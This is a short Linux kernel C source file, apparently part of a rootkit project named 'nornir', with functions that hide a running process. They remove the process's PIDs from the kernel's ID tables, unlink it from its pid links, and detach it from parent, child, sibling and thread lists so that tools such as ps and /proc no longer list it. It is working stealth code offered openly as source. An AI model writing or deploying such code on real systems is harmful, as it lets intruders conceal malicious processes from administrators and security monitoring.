/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/idr.h>
#include <linux/pid_namespace.h>

void nornir_hide_process_pid(struct task_struct *task, struct pid *pid)
{
    struct upid *upid;

    /* hide from pid's radix trie */
    for (int i = 0; i < pid->level; i++) {
        upid = pid->numbers + i;
        idr_remove(&upid->ns->idr, upid->nr);
    }

    /* hide from task_struct->pid_links */
    for (int i = 0; i < PIDTYPE_MAX; i++) {
        hlist_del_rcu(&task->pid_links[i]);
        INIT_HLIST_NODE(&task->pid_links[i]);
    }
}

void nornir_hide_process_task_struct(struct task_struct *task)
{
    /* set its parent to itself */

    task->parent = task;
    task->real_parent = task;
    task->group_leader = task;

    /* del from some link-list */

    list_del(&task->children);
    INIT_LIST_HEAD(&task->children);

    list_del(&task->sibling);
    INIT_LIST_HEAD(&task->sibling);

    list_del(&task->thread_node);
    INIT_LIST_HEAD(&task->thread_node);

    list_del(&task->thread_group);
    INIT_LIST_HEAD(&task->thread_group);
}
